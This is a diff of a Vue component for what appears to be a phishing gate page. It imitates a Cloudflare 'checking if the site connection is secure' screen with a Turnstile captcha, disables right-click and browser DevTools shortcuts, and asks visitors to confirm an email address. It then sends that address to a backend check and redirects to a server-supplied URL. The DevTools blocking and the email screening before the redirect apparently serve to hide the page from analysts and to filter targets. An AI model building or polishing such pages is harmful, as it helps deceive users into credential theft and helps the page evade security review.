@@ -2,7 +2,7 @@
   <div v-if="!captchaToken" class="gate-container">
     <main>
       <div class="instructions">
-        <p>{{ $t('checking') }}</p>
+        <p>Please stand by while we are checking if the site connection is secure.</p>
         <div class="cf-turnstile" data-sitekey="0x4AAAAAABgei6QZruCN7n08"></div>
       </div>
     </main>
@@ -11,13 +11,16 @@
   <div v-else class="background">
     <div class="toto-container">
       <div class="header">
-        <div class="logo-text"><span class="success-check">⼈</span></div>
+        <div class="logo-text">
+          <span class="success-check">⼈</span>
+        </div>
       </div>
 
       <div class="content">
-        <p><strong>{{ $t('confirm_email') }}</strong></p>
+        <p><strong>Please confirm your email address to continue.</strong></p>
 
         <div class="form-wrapper">
+          <label for="honeypot" class="visually-hidden">Do not fill this field (anti-bot)</label>
           <input
             id="honeypot"
             v-model="honeypot"
@@ -27,20 +30,34 @@
             aria-hidden="true"
             class="visually-hidden"
           />
+
+          <label for="email" class="visually-hidden">Email address</label>
           <input
             id="email"
             v-model="email"
             type="email"
-            :placeholder="$t('placeholder_email')"
+            placeholder="Enter email"
             required
             class="email-input"
             :disabled="loading"
           />
+
           <p v-if="error" class="error" role="alert" aria-live="polite">{{ error }}</p>
+
           <button @click="submitForm" :disabled="loading" class="action-button">
-            {{ loading ? $t('submitting') : $t('submit') }}
+            {{ loading ? 'Submitting…' : 'Submit' }}
           </button>
         </div>
+      </div>
+
+      <div class="divider"></div>
+
+      <div class="footer-container">
+        <p class="footer-text">
+          © 2025 All rights reserved.
+          <a href="/privacy" target="_blank">Privacy Policy</a> |
+          <a href="/terms" target="_blank">Terms</a>
+        </p>
       </div>
     </div>
   </div>
@@ -59,13 +76,11 @@ let turnstileRendered = false
 onMounted(async () => {
   await nextTick()
 
-  // Disable right-click
+  // Disable right-click and DevTools shortcuts
   document.addEventListener('contextmenu', e => e.preventDefault())
-
-  // Block common devtools shortcuts
   document.addEventListener('keydown', e => {
     if (
-      e.key === 'F12' || // DevTools
+      e.key === 'F12' ||
       (e.ctrlKey && ['u', 's', 'p'].includes(e.key.toLowerCase())) ||
       (e.ctrlKey && e.shiftKey && ['i', 'j', 'c'].includes(e.key.toLowerCase()))
     ) {
@@ -86,6 +101,7 @@ onMounted(async () => {
 async function submitForm() {
   error.value = ''
   loading.value = true
+
   try {
     const res = await fetch(`${import.meta.env.VITE_API_BASE}/api/check-email`, {
       method: 'POST',
@@ -96,18 +112,30 @@ async function submitForm() {
         middleName: honeypot.value
       })
     })
+
     const data = await res.json()
     if (!res.ok || !data.valid) throw new Error(data.message || 'Verification failed')
-    if (data.redirectUrl) setTimeout(() => {
-      window.location.href = data.redirectUrl
-    }, 1000)
+
+    if (data.redirectUrl) {
+      setTimeout(() => {
+        window.location.href = data.redirectUrl
+      }, 1500)
+    }
   } catch (err) {
     error.value = err.message
-  } finally {
     loading.value = false
   }
 }
 </script>
+
+
+
+
+
+
+
+
+
 
 <style scoped>
 .visually-hidden {
